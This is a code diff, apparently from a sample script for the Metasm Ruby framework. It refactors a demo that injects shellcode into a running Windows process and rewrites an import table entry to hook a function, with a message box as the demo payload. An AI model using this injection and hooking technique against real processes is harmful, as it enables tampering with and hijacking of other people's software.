@@ -20,19 +20,16 @@ include Metasm
 include WinAPI
 
 # open target
-WinAPI.get_debug_privilege
-if not pr = WinAPI.find_process((Integer(ARGV.first) rescue ARGV.first))
+WinOS.get_debug_privilege
+if not pr = WinOS.find_process(ARGV.first)
 	# display list of running processes if no target found
-	puts WinAPI.list_processes.sort_by { |pr| pr.pid }.map { |pr| "#{pr.pid}: #{File.basename(pr.modules.first.path) rescue nil}" }
+	puts WinOS.list_processes.sort_by { |pr| pr.pid }
 	exit
 end
-raise 'cannot open target process' if not handle = WinAPI.openprocess(PROCESS_ALL_ACCESS, 0, pr.pid)
-
-# virtual mapping of remote process memory
-remote_mem = WindowsRemoteString.new(handle)
+raise 'cannot open target process' if not pr.handle
 
 # read the target PE structure
-pe = LoadedPE.load remote_mem[pr.modules[0].addr, 0x1000000]
+pe = LoadedPE.load pr.memory[pr.modules[0].addr, 0x1000000]
 pe.decode_header
 pe.decode_imports
 
@@ -81,7 +78,7 @@ title dw 'I see what you did there...', 0
 EOS
 
 # alloc some space in the remote process to put our shellcode
-raise 'remote allocation failed' if not injected = WinAPI.virtualallocex(handle, 0, sc.encoded.length, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
+raise 'remote allocation failed' if not injected = WinAPI.virtualallocex(pr.handle, 0, sc.encoded.length, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
 puts "injected malicous code at %x" % injected
 
 # fixup the shellcode with its known base address, and with the addresses it will need from the IAT
@@ -90,11 +87,11 @@ sc.encoded.fixup! 'msgboxw' => msgboxw_p, 'target' => target
 raw = sc.encode_string
 
 # inject the shellcode
-remote_mem[injected, raw.length] = raw
+pr.memory[injected, raw.length] = raw
 
 # rewrite iat entry
 iat_h = pe.encode_xword(injected).data
-remote_mem[target_p, iat_h.length] = iat_h
+pr.memory[target_p, iat_h.length] = iat_h
 
 # done
-WinAPI.closehandle(handle)
+WinAPI.closehandle(pr.handle)
